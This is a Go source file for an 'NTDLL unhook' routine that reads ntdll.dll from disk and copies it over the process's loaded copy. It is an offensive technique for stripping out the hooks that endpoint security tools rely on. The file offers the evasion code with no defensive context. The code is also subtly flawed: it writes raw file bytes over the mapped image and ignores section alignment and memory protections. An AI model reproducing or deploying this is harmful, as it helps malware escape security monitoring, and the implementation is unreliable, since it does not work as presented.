package syscall

import (
"os"
"syscall"
"unsafe"
)

type NTDLLUnhook struct{}

func NewNTDLLUnhook() *NTDLLUnhook {
return &NTDLLUnhook{}
}

func (n *NTDLLUnhook) Unhook() error {
ntdllPath := "C:\\Windows\\System32\\ntdll.dll"
data, err := os.ReadFile(ntdllPath)
if err != nil {
return err
}

ntdll, err := syscall.LoadDLL("ntdll.dll")
if err != nil {
return err
}

// Get the base address of ntdll in memory
ntdllBase := ntdll.Handle

// Copy clean ntdll from disk to memory
ntdllData := (*[1 << 30]byte)(unsafe.Pointer(ntdllBase))
for i := 0; i < len(data); i++ {
ntdllData[i] = data[i]
}

return nil
}
